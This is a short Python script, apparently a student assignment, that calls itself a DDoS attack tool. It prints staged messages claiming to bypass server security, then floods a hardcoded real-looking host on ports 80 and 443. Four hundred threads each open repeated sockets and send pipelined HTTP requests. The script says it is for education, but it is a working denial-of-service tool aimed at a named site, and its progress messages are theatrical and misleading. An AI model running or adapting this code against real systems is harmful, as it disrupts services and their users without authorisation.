import subprocess
import time
import socket
import random
import threading

print("\033[92m")

# Interface
subprocess.run(["clear"])
subprocess.run(["figlet", "DDOS ATTACK"])

print()
print("Author   : Robson Junior")
print("Github   : github.com/robsujunior")
print("Note: Ferramenta para fins educacionais!")
print()

ip = input("IP Target : ")

subprocess.run(["clear"])
subprocess.run(["figlet", "Trabalho SASI"])

print("Team : Robson e Marcus")
print("\033[92m")

print("________________TENTANDO ACESSAR O SERVIDOR__________________")
time.sleep(3)
print("___________________ESTABELECENDO CONEXÃO_____________________")
time.sleep(3)
print("______________IGNORANDO A CAMADA DE SEGURANÇA________________")
time.sleep(3)
print("___________________CONEXÃO ESTABELECIDA______________________")
time.sleep(3)
print("ATAQUE DDOS INICIADO(educacional)")
time.sleep(3)


import socket
import threading
import random

# Configurações
ip = "portal-do-estudante.vercel.app"
tentativas_por_thread = 1000 # Evita loop infinito travando o PC

def estresse_maximo(host, porta):
    # Criamos um payload de tamanho variável para forçar o processamento do servidor
    payload = f"GET /{random.randint(1,1000)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: StressTest\r\n\r\n".encode()
    
    for _ in range(tentativas_por_thread):
        try:
            # Criar o socket com timeout baixíssimo para não desperdiçar tempo
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5) 
            
            sock.connect((host, porta))
            
            # Enviar o payload repetidamente na mesma conexão (Pipeline)
            for _ in range(10): 
                sock.sendall(payload)
                
            # NOTA: Não usamos sock.recv() para não bloquear a thread
            # O fechamento forçado gera overhead no kernel do servidor
            sock.close() 
            
        except Exception:
            # Em testes de carga, ignoramos erros para manter a velocidade
            pass

threads = []

print(f"--- INICIANDO CARGA MÁXIMA EM {ip} ---")

# Aumentamos o número de threads. 
# Cuidado: valores muito altos podem travar o SEU computador.
for i in range(200):  
    t80 = threading.Thread(target=estresse_maximo, args=(ip, 80))
    t443 = threading.Thread(target=estresse_maximo, args=(ip, 443))
    
    t80.start()
    t443.start()
    threads.extend([t80, t443])

for t in threads:
    t.join()

print("--- TESTE FINALIZADO ---")

print("Todas as threads finalizaram")

